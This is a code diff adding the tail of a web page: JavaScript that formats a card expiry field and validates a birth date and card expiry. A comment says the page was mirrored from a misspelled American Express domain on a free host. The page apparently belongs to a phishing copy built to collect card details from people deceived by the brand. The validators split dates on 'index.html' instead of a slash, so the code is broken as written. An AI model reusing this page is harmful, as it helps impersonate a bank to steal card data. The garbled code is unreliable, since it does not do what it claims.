+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            } else if (value.length === 2) {
+                value = value + '/';
+            }
+            
+            input.value = value;
+            validateExpiry();
+        }
+
+        function isValidDate(dateString) {
+            const parts = dateString.split('index.html');
+            if (parts.length !== 3) return false;
+            
+            const day = parseInt(parts[0], 10);
+            const month = parseInt(parts[1], 10);
+            const year = parseInt(parts[2], 10);
+            
+            if (isNaN(day) || isNaN(month) || isNaN(year)) return false;
+            if (day < 1 || day > 31) return false;
+            if (month < 1 || month > 12) return false;
+            if (year < 1900 || year > new Date().getFullYear()) return false;
+            
+            return true;
+        }
+
+        function isValidExpiry(expiryString) {
+            const parts = expiryString.split('index.html');
+            if (parts.length !== 2) return false;
+            
+            const month = parseInt(parts[0], 10);
+            const year = parseInt(parts[1], 10) + 2000;
+            
+            if (isNaN(month) || isNaN(year)) return false;
+            if (month < 1 || month > 12) return false;
+            
+            const currentDate = new Date();
+            const currentYear = currentDate.getFullYear();
+            const currentMonth = currentDate.getMonth() + 1;
+            
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            
+            return true;
+        }
+
+        // Initialize the form when the page loads
+        window.onload = initForm;
+    </script>
+</body>
+  
+<!-- Mirrored from s-american-expresss.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 14 Jan 2026 05:14:28 GMT -->
+</html>
